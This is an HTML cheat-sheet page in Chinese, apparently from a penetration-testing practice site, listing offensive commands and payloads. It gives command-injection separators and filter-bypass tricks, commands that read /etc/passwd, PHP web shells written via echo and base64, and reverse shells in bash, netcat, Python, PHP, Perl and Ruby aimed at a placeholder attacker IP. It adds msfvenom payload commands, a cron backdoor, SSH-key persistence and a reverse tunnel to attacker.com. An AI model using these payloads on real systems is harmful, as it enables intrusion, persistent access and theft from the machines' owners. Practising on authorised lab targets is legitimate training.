<div class="panel fade-in">
    <h2>📖 命令速查表</h2>
    <p class="alert alert-info">
        包含常用命令、Payload、反弹Shell等，方便练习时快速参考。
    </p>

    <!-- 搜索框 -->
    <div class="form-group">
        <input type="text" id="cheatSearch" placeholder="🔍 搜索速查内容..." onkeyup="filterCheats()">
    </div>

    <div id="cheatContent">

    <!-- 1. 命令执行基础Payload -->
    <div class="cheat-section">
        <h3>🚀 命令执行基础Payload</h3>
        <div class="table-wrap">
            <table>
                <tr><th>分隔符</th><th>说明</th><th>示例</th></tr>
                <tr><td><code>;</code></td><td>命令分隔符，顺序执行</td><td><code>cmd1; cmd2</code></td></tr>
                <tr><td><code>|</code></td><td>管道，前输出作为后输入</td><td><code>cmd1 | cmd2</code></td></tr>
                <tr><td><code>||</code></td><td>或，前失败才执行后</td><td><code>cmd1 || cmd2</code></td></tr>
                <tr><td><code>&&</code></td><td>与，前成功才执行后</td><td><code>cmd1 && cmd2</code></td></tr>
                <tr><td><code>` `</code></td><td>命令替换</td><td><code>`whoami`</code></td></tr>
                <tr><td><code>$()</code></td><td>命令替换（现代写法）</td><td><code>$(whoami)</code></td></tr>
                <tr><td><code>%0a</code></td><td>URL编码换行</td><td><code>cmd1%0acmd2</code></td></tr>
                <tr><td><code>%0d</code></td><td>URL编码回车</td><td><code>cmd1%0dcmd2</code></td></tr>
            </table>
        </div>
    </div>

    <!-- 2. 读取文件 -->
    <div class="cheat-section">
        <h3>📖 读取文件命令</h3>
        <ul class="payload-list">
            <li><code>cat /etc/passwd</code> - 查看用户文件</li>
            <li><code>tac /etc/passwd</code> - 反向查看</li>
            <li><code>head -n 5 /etc/passwd</code> - 查看前5行</li>
            <li><code>tail -n 5 /etc/passwd</code> - 查看后5行</li>
            <li><code>less /etc/passwd</code> - 分页查看</li>
            <li><code>more /etc/passwd</code> - 分页查看</li>
            <li><code>nl /etc/passwd</code> - 带行号查看</li>
            <li><code>sed -n '1,$p' /etc/passwd</code> - 流编辑器</li>
            <li><code>awk '1' /etc/passwd</code> - 文本处理</li>
            <li><code>grep root /etc/passwd</code> - 搜索内容</li>
            <li><code>xxd /etc/passwd</code> - 十六进制查看</li>
            <li><code>od -c /etc/passwd</code> - 八进制查看</li>
        </ul>
    </div>

    <!-- 3. 系统信息 -->
    <div class="cheat-section">
        <h3>💻 系统信息收集</h3>
        <ul class="payload-list">
            <li><code>uname -a</code> - 系统版本</li>
            <li><code>cat /etc/os-release</code> - 发行版信息</li>
            <li><code>whoami</code> - 当前用户</li>
            <li><code>id</code> - 用户ID和组</li>
            <li><code>cat /etc/passwd</code> - 所有用户</li>
            <li><code>ifconfig / ip addr</code> - 网络配置</li>
            <li><code>netstat -tulnp</code> - 监听端口</li>
            <li><code>ss -tulnp</code> - 套接字统计</li>
            <li><code>ps aux</code> - 进程列表</li>
            <li><code>top -b -n 1</code> - 进程概览</li>
            <li><code>w / who</code> - 登录用户</li>
            <li><code>last / lastlog</code> - 登录历史</li>
            <li><code>sudo -l</code> - sudo权限</li>
        </ul>
    </div>

    <!-- 4. 写文件 -->
    <div class="cheat-section">
        <h3>✏️ 写文件技巧</h3>
        <ul class="payload-list">
            <li><code>echo '&lt;?php phpinfo();?>' > shell.php</code></li>
            <li><code>printf '<?php system($_GET["cmd"]);?>' > shell.php</code></li>
            <li><code>echo "PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==" | base64 -d > shell.php</code></li>
            <li><code>cat > shell.php <<EOF &lt;?php system(\$_GET['cmd']); ?> EOF</code></li>
        </ul>
    </div>

    <!-- 5. 绕过技巧 -->
    <div class="cheat-section">
        <h3>🔄 绕过技巧汇总</h3>
        
        <h4>空格绕过：</h4>
        <ul class="payload-list">
            <li><code>cat${IFS}/etc/passwd</code> - $IFS变量</li>
            <li><code>{cat,/etc/passwd}</code> - 花括号</li>
            <li><code>cat&lt;/etc/passwd</code> - 重定向</li>
            <li><code>cat$IFS$9/etc/passwd</code> - $9分隔</li>
            <li><code>cat%09/etc/passwd</code> - 制表符</li>
        </ul>

        <h4>关键词绕过：</h4>
        <ul class="payload-list">
            <li><code>c''at /etc/passwd</code> - 单引号拼接</li>
            <li><code>c""at /etc/passwd</code> - 双引号拼接</li>
            <li><code>c\at /etc/passwd</code> - 反斜杠拼接</li>
            <li><code>/???/??t /???/??????</code> - 通配符</li>
            <li><code>tac /etc/passwd</code> - 替换命令</li>
        </ul>

        <h4>编码绕过：</h4>
        <ul class="payload-list">
            <li><code>echo "d2hvYW1p" | base64 -d | bash</code> - Base64</li>
            <li><code>$(printf "\x63\x61\x74")</code> - Hex编码</li>
            <li><code>$(echo "whoami" | tr 'a-z' 'n-za-m')</code> - ROT13</li>
        </ul>
    </div>

    <!-- 6. 反弹Shell -->
    <div class="cheat-section">
        <h3>🔄 反弹Shell大全</h3>
        
        <h4>Bash：</h4>
        <div class="source-code"><pre><span class="php">bash -i >& /dev/tcp/攻击者IP/端口 0>&1</span></pre></div>

        <h4>Netcat：</h4>
        <div class="source-code"><pre><span class="php">nc -e /bin/bash 攻击者IP 端口
# 如果-e不可用：
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 攻击者IP 端口 >/tmp/f</span></pre></div>

        <h4>Python：</h4>
        <div class="source-code"><pre><span class="php">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("攻击者IP",端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</span></pre></div>

        <h4>PHP：</h4>
        <div class="source-code"><pre><span class="php">php -r '$sock=fsockopen("攻击者IP",端口);exec("/bin/bash -i <&3 >&3 2>&3");'</span></pre></div>

        <h4>Perl：</h4>
        <div class="source-code"><pre><span class="php">perl -e 'use Socket;$i="攻击者IP";$p=端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'</span></pre></div>

        <h4>Ruby：</h4>
        <div class="source-code"><pre><span class="php">ruby -rsocket -e 'f=TCPSocket.open("攻击者IP",端口).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'</span></pre></div>

        <h4>MSFvenom生成：</h4>
        <div class="source-code"><pre><span class="php">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=攻击者IP LPORT=端口 -f elf > shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=攻击者IP LPORT=端口 -f raw > shell.php
msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击者IP LPORT=端口</span></pre></div>
    </div>

    <!-- 7. PHP代码执行 -->
    <div class="cheat-section">
        <h3>🐘 PHP代码执行Payload</h3>
        <ul class="payload-list">
            <li><code>eval(\$_POST['cmd']);</code></li>
            <li><code>assert(\$_POST['cmd']);</code> - PHP 7以下可执行</li>
            <li><code>preg_replace("/.*/e", \$_POST['cmd'], "");</code> - /e修饰符（已废弃）</li>
            <li><code>call_user_func(\$_POST['func'], \$_POST['arg']);</code></li>
            <li><code>\$_GET['func']();</code> - 动态函数</li>
            <li><code>array_map(\$_POST['func'], \$_POST['args']);</code></li>
        </ul>
    </div>

    <!-- 8. 文件系统 -->
    <div class="cheat-section">
        <h3>📁 文件系统操作</h3>
        <ul class="payload-list">
            <li><code>ls -la /</code> - 列根目录</li>
            <li><code>find / -name "*.php" 2>/dev/null</code> - 查找PHP文件</li>
            <li><code>find / -perm -u=s 2>/dev/null</code> - 查找SUID文件</li>
            <li><code>find / -writable 2>/dev/null</code> - 查找可写文件</li>
            <li><code>file /etc/passwd</code> - 文件类型</li>
            <li><code>stat /etc/passwd</code> - 文件详情</li>
            <li><code>du -sh /var/www</code> - 目录大小</li>
        </ul>
    </div>

    <!-- 9. 权限维持 -->
    <div class="cheat-section">
        <h3>🔒 权限维持</h3>
        <ul class="payload-list">
            <li><code>echo "* * * * * /bin/bash -i >& /dev/tcp/攻击者IP/端口 0>&1" >> /var/spool/cron/crontabs/root</code> - Cron后门</li>
            <li><code>echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys</code> - SSH密钥</li>
            <li><code>chmod 600 ~/.ssh/authorized_keys</code> - 设置权限</li>
        </ul>
    </div>

    <!-- 10. 内网扫描 -->
    <div class="cheat-section">
        <h3>🌐 内网渗透基础</h3>
        <ul class="payload-list">
            <li><code>for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i & done</code> - Ping扫描</li>
            <li><code>nc -zv 192.168.1.100 22,80,443,3306</code> - 端口扫描</li>
            <li><code>timeout 1 bash -c "echo >/dev/tcp/192.168.1.100/80" 2>/dev/null && echo "open"</code> - TCP扫描</li>
            <li><code>ssh -L 8080:localhost:80 user@target.com</code> - SSH隧道</li>
            <li><code>ssh -R 8080:localhost:80 user@attacker.com</code> - 反向隧道</li>
        </ul>
    </div>

    </div>
</div>

<script>
function filterCheats() {
    const input = document.getElementById('cheatSearch');
    const filter = input.value.toLowerCase();
    const content = document.getElementById('cheatContent');
    const sections = content.getElementsByClassName('cheat-section');
    
    for (let i = 0; i < sections.length; i++) {
        const section = sections[i];
        const text = section.textContent || section.innerText;
        if (text.toLowerCase().indexOf(filter) > -1) {
            section.style.display = '';
        } else {
            section.style.display = 'none';
        }
    }
}
</script>
